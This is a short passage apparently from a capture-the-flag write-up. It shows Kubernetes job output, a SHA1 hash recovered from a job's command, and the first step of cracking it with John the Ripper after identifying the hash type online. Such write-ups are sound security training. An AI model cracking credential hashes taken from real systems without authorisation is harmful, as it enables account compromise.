  Volumes:        <none>
Events:
  Type    Reason            Age     From            Message
  ----    ------            ----    ----            -------
  Normal  SuccessfulCreate  4y252d  job-controller  Created pod: internship-job-5drbm
  Normal  Completed         4y252d  job-controller  Job completed
```

```
      echo
      26c3d1c068e7e01599c3612447410b5e56c779f1
```

Aha!

First I identified hash via https://hashes.com/en/tools/hash_identifier which pointed me at SHA1

On my machine:

```
echo '26c3d1c068e7e01599c3612447410b5e56c779f1' > hash.txt
```


![](john.png)